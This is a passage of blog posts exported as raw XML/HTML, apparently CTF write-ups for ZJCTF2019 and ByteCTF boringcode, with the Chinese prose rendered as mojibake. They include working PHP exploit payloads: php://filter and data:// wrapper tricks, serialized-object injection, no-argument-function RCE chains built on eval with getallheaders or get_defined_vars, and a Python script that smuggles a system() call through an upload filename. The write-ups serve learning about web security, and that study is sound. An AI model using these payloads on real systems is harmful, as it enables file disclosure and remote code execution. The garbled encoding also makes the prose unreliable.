<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:71:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ç”¨è¿™ç§æ–¹æ³•ä¸èƒ½åœ¨https://www.ctfhub.com/#/challengeé¶æœºä¸Šè§£é¢˜ï¼Œä¹Ÿæ‹¿ä¸åˆ°webç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå…ˆç•™ä¸ªå‘ã€‚</p>
<h2 id="ZJCTF2019-é€†è½¬æ€ç»´">ZJCTF2019 é€†è½¬æ€ç»´</h2>
<p>é¢˜ç›®åœ°å€ï¼š<a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p>
<p>ç›´æ¥ç»™å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="file-get-contentsç»•è¿‡">file_get_contentsç»•è¿‡</h3>
<p>æœ‰ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼š</p>
<ol>
<li>ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡<br>
â‘  å°†è¦GETçš„å‚æ•°?xxx=php://input<br>
â‘¡ ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼</li>
<li>ç”¨data://ä¼ªåè®®ç»•è¿‡<br>
å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64ï¼Œæƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç <br>
æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="è¯»å–useless-php">è¯»å–useless.php</h3>
<p>é¢˜ç›®æœ‰ç¬¬äºŒä¸ªå‚æ•°fileï¼Œå¤§æ¦‚æ˜¯include()è¿™ä¸ªfileï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¦åŒ…å«useless.phpï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯fileå‚æ•°ä¸èƒ½ä¼ å…¥flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.phpã€‚</p>
<p>åˆ©ç”¨php://filteråè®®è¯»å–è¿™ä¸ªuseless.phpï¼Œæ„é€ payloadè¯»å–useless.phpï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h3>
<p>useless.phpçš„é­”æœ¯æ–¹æ³•æ˜¯<code>__toString()</code>ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨<code>echo $password</code>è§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚</p>
<p>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ç»¼åˆèµ·æ¥çš„payloadå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ByteCTF2019-ezcms">ByteCTF2019 ezcms</h2>
<p>é¢˜ç›®åœ°å€ï¼š<a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p>
]]></content>
  </entry>
  <entry>
    <title>ä»ä¸€é“é¢˜å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</title>
    <url>/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="ä»ByteCTF-boringcode-å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨">ä»ByteCTF boringcode å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</h1>
<h2 id="0x01-é¢˜ç›®æºç ">0x01 é¢˜ç›®æºç </h2>
<p>é¢˜ç›®ç¯å¢ƒï¼š<a href="https://github.com/CTFTraining/bytectf_2019_web_boring_code">https://github.com/CTFTraining/bytectf_2019_web_boring_code</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span>(<span class="params">$url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/data:\/\//i&#x27;</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error: host not allowed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error: invalid url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªé¡µé¢çš„ä½œç”¨æ˜¯ï¼Œæ¥å—ä¸€ä¸ªurlå‚æ•°ï¼Œåˆ©ç”¨file_get_contentè¿œç¨‹è·å–urlé¡µé¢çš„æºç ï¼Œä¼ é€’ç»™evalæ‰§è¡Œã€‚ä½†åœ¨urlä¼ é€’å’Œæºç ä¼ é€’è¿‡ç¨‹ä¸­æœ‰å„ç§æ£€æµ‹ã€‚</p>
<h2 id="0x02-è€ƒç‚¹ä¸€">0x02 è€ƒç‚¹ä¸€</h2>
<ol>
<li><code>is_valid_url()</code>å‡½æ•°æ¥æ£€æµ‹urlçš„æ­£ç¡®æ€§ï¼Œå¹¶ç¦æ­¢ä½¿ç”¨dataåè®®ã€‚</li>
<li>urlçš„hostå¿…é¡»ä»¥baidu.comç»“å°¾ã€‚</li>
</ol>
<p>è¿™é‡Œå¦‚æœæ²¡æœ‰<code>is_valid_url()</code>æ˜¯å¯ä»¥ä½¿ç”¨dataä¼ªåè®®ç»•è¿‡åŸŸåçš„é™åˆ¶ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­æ‰€ç¤ºï¼š</p>
<blockquote>
<p>PHP.iniï¼š<br>
data://åè®®å¿…é¡»åŒåœ¨onæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼›<br>
allow_url_fopen ï¼šon<br>
allow_url_includeï¼šon<br>
php ç‰ˆæœ¬å¤§äºç­‰äº php5.2</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$r = parse_url($url);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">	$code = file_get_contents($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615115828.png" alt=""></p>
<p>è¿™é‡ŒæŠŠdataåè®®ç¦æ­¢äº†ä¹‹åï¼Œæƒ³è¦åˆ©ç”¨ä¼ªåè®®ç»•è¿‡çš„è¯è¿‘ä¹æ— è§£ã€‚</p>
<p>ä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šéªšæ“ä½œï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦è®²ä¸‹é¢çš„çŸ¥è¯†ï¼Œè‡³äºæ€ä¹ˆç»•è¿‡æˆ‘å°±ç›´æ¥æ”¾ä¸€ä¸ªé“¾æ¥ï¼š<a href="https://www.guildhab.top/?p=1077">https://www.guildhab.top/?p=1077</a></p>
<h2 id="0x02-è€ƒç‚¹äºŒ">0x02 è€ƒç‚¹äºŒ</h2>
<ol>
<li>ç”±<code>preg_replace('/[a-z]+\((?R)?\)/'</code>å¯çŸ¥ï¼Œè¿™é‡Œåªå…è®¸æ— å‚æ•°çš„å‡½æ•°ä¼ é€’è¿›æ¥ã€‚å¹¶ä¸”å‡½æ•°ååªèƒ½ä¸ºå­—æ¯ï¼Œä¸èƒ½åŒ…å«ä¸‹åˆ’çº¿ç­‰å…¶ä»–ç‰¹æ®Šå­—ç¬¦ã€‚</li>
<li>è¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®å­—ï¼š<code>et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</code></li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å¿…é¡»æ˜¯ä¸€ä¸ªåªå«å­—æ¯å¹¶ä¸”æ²¡æœ‰å‚æ•°çš„å‡½æ•°çš„payload.åŒæ—¶å¯ä»¥æ³¨æ„åˆ°è¿™ä¸ªæ˜¯å¯ä»¥è¿›è¡Œä¸€ä¸ªå‡½æ•°çš„å¥—ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ„é€ å¤šä¸ªç©ºå‚æ•°çš„å‡½æ•°å»è¯»å–flagã€‚</p>
<p>é¦–å…ˆçœ‹<code>scandir()</code>å‡½æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615123720.png" alt=""></p>
<p><code>scandir('.')</code>èƒ½å¤Ÿè¿”å›å½“å‰ç›®å½•çš„æ–‡ä»¶åˆ—è¡¨çš„æ•°ç»„ï¼Œé‚£ä¹ˆæ€ä¹ˆå–å‡ºæ–‡ä»¶åå’Œè¯»å–æ–‡ä»¶å‘¢ï¼Œå¯ä»¥ä½¿ç”¨<code>end()</code>å’Œ<code>readfile()</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200615123822121.png" alt=""></p>
<p>ä½†æ˜¯è¿˜éœ€è¦æ„é€ å‡½æ•°<code>scandir('.')</code>ä¸­çš„å‚æ•°<code>.</code>ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª<code>localeconv()</code>å‡½æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615121715.png" alt=""></p>
<p>å…¶ä¸­æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯<code>.</code>ï¼Œè€Œä¸<code>end()</code>ç›¸åçš„å–ç¬¬ä¸€ä¸ªå…ƒç´ çš„å‡½æ•°æœ‰ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615121937.png" alt=""></p>
<p>å› ä¸ºè¿™é‡Œè¿˜è¿‡æ»¤enï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†åè€…ã€‚é‚£ä¹ˆå°±å¯ä»¥æ„é€ å¦‚ä¸‹payloadå¯ä»¥è¯»å–åˆ°æ–‡ä»¶æœ¬åœ°æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(end(scandir(pos(localeconv()))))</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯flagå¹¶ä¸åœ¨æœ¬æ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°æ”¹å˜å½“å‰ç›®å½•çš„å‡½æ•°ï¼š<code>chdir() </code>å‡½æ•°å¯ä»¥æ”¹å˜å½“å‰çš„ç›®å½•ï¼Œæ­¤å¤–è¿˜éœ€è¦å€ŸåŠ©<code>next()</code>å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ è¿™é‡Œå¯ä»¥è·å–åˆ°scandir()è¿”å›çš„<code>..</code>ã€‚</p>
<p>ä½†æ˜¯<code>chdir()</code>å‡½æ•°å¹¶ä¸ä¼šè¿”å›ä¸€ä¸ªç›®å½•åˆ—è¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªBoolå€¼ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p>
<p><strong>ç¬¬ä¸€ç§åŠæ³•æ˜¯ä½¿ç”¨ifè¯­å¥</strong>ï¼Œä¹Ÿå°±æ˜¯å½“è·³è½¬ç›®å½•æˆåŠŸæ—¶å€™å°±è¯»å–å½“å‰æ–‡ä»¶ã€‚æ„é€ å¦‚ä¸‹payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615125747.png" alt=""></p>
<p><strong>ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>localtime()</code>é…åˆ<code>chr</code></strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615141446.png" alt=""></p>
<p>è·å–<code>.</code>çš„payloadï¼š<code>chr(pos(localtime()))</code></p>
<p>å½“æ—¶é—´ä¸ºæŸä¸€åˆ†é’Ÿçš„46ç§’æ—¶ï¼Œ<code>pos(localtime())</code>è¿”å›46ï¼Œè€Œä¸”46æ˜¯<code>.</code>çš„ASCIIç å€¼ï¼Œæ‰€ä»¥payloadå°±ä¼šè¿”å›<code>.</code>ã€‚</p>
<p>ä½†æ˜¯<code>localtime</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¥æ”¶ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨time()æ¥è§£å†³ã€‚time()ä¸ä¼šå—å‚æ•°çš„å½±å“å¹¶ä¸”ä¼šè¿”å›ä¸€ä¸ªæ—¶é—´æˆ³ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„payloadå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>chdir(next(scandir(pos(localeconv()))))</code>æ›´æ¢å½“å‰è·¯å¾„ï¼Œ<code>scandir(chr(pos(localtime(time))))</code>åˆ—å‡ºæ›´æ”¹è·¯å¾„åçš„å½“å‰ç›®å½•ç»“æ„ã€‚</p>
<h2 id="0x04-æ— å‚æ•°å‡½æ•°å°ç»“">0x04 æ— å‚æ•°å‡½æ•°å°ç»“</h2>
<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">Skyå¸ˆå‚…çš„æ–‡ç« </a>å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªå°ç»“ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_POST[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å’Œä¸Šé¢çš„åŒºåˆ«åœ¨äºè¿™é‡Œè¿˜å¯ä»¥è¿è¡Œå‡½æ•°åç§°åŒ…å«<code>_</code>ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚</p>
<h3 id="getenv-è·å–ç¯å¢ƒå˜é‡">getenv()è·å–ç¯å¢ƒå˜é‡</h3>
<blockquote>
<p>ç‰ˆæœ¬è¦æ±‚PHP &gt; 7.1</p>
</blockquote>
<p>ä½¿ç”¨getenv()è·å–è¶…å…¨å±€å˜é‡çš„æ•°ç»„ï¼Œä½¿ç”¨array_randå’Œarray_flipçˆ†ç ´å‡ºæ‰€æœ‰çš„å…¨å±€å˜é‡ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153220.png" alt=""></p>
<h3 id="getallheaders">getallheaders()</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getallheaders()        è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯, æ˜¯ä¸‹é¢å‡½æ•°çš„åˆ«å</span><br><span class="line">apache_request_headers    è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™ä¸¤ä¸ªå‡½æ•°åªé€‚ç”¨äºapacheæœåŠ¡å™¨</p>
</blockquote>
<p>æ·»åŠ ä¸€ä¸ªHeaderä¸º<code>ca01h: phpinfo();</code>,æ ¹æ®ä½ç½®é€‰æ‹©åˆé€‚çš„payloadï¼š</p>
<ol>
<li>
<p>æ·»åŠ åœ¨Headeråœ¨ç¬¬ä¸€ä¸ªï¼š</p>
<p>payload: <code>code=eval(pos(getallheaders()));</code></p>
<p>(pos()å¯ä»¥æ¢ä¸ºcurrent(). å¦‚æœåœ¨ç¬¬äºŒä¸ªå¯ä»¥ä½¿ç”¨next())</p>
</li>
<li>
<p>æ·»åŠ åœ¨Headeråœ¨æœ€åä¸€ä¸ªï¼š</p>
<p>payload: <code>code=eval(end(getallheaders()));</code></p>
</li>
<li>
<p>ä¸çŸ¥é“ä½ç½®ï¼š</p>
<p>é…åˆ<code>array_rand()</code>, <code>array_flip()</code>æ„é€ payloadè¿›è¡Œçˆ†ç ´ï¼š</p>
<p>payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153850.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615153935.png" alt=""></p>
<h3 id="get-defined-vars">get_defined_vars()</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get_defined_vars() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å’Œgetallheaders()åˆ©ç”¨ç±»ä¼¼ï¼Œä½†æ˜¯ä¸æ­¢apache, ngnixå’Œå…¶ä»–çš„ä¹Ÿå¯ä»¥ç”¨</p>
</blockquote>
<p>å‡½æ•°è¿”å›çš„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="åˆ©ç”¨-GET">åˆ©ç”¨<code>$_GET</code></h4>
<p>urlï¼š<a href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();</a></p>
<p>postï¼š<code>code=eval(end(current(get_defined_vars())));</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200615154453.png" alt=""></p>
<h4 id="åˆ©ç”¨-FILE">åˆ©ç”¨<code>$_FILE</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/ctf/boringcode/rce.php&#x27;</span>, data=data, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æŠŠpayloadæ”¾åœ¨æ–‡ä»¶åä¸Šï¼Œç„¶åç”¨ä¸¤æ¬¡<code>pos</code>å®šä½è¿›è¡Œåˆ©ç”¨ã€‚</p>
<h2 id="0x05-æ€»ç»“">0x05 æ€»ç»“</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</span><br><span class="line">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line">readfile()  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">current()       è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line">pos()           current() çš„åˆ«å</span><br><span class="line">next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">end()       å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_rand()    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</span><br><span class="line">array_flip()    array_flip() å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</span><br><span class="line"></span><br><span class="line">chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII 